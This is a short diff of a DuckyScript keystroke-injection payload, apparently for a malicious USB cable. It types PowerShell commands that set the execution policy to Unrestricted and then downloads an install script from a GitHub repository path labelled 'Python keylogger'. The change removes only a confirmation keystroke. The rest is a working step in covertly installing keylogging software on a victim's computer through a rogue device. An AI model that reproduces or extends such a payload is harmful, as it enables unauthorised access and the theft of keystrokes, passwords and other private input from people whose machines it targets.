@@ -12,9 +12,6 @@ ENTER
 REM --> Allows powershell scripts to be run,todo: set back after installing
 STRING powershell Set-ExecutionPolicy -scope CurrentUser Unrestricted
 ENTER
-DELAY 500
-STRING Y
-ENTER
 REM --> Downloads ps1 file
 STRING wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/Python%20keylogger%20stuff%20with%20DUCKYscript/install_python.ps1" -outfile "install_python.ps1"
 ENTER
